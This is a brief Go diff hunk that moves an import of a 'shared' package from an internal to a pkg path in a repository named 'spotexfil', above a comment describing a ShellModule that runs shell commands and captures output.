@@ -12,7 +12,7 @@ import (
 	"sync"
 	"time"
 
-	"github.com/sourcefrenchy/spotexfil/internal/shared"
+	"github.com/sourcefrenchy/spotexfil/pkg/shared"
 )
 
 // ShellModule executes shell commands and captures output.
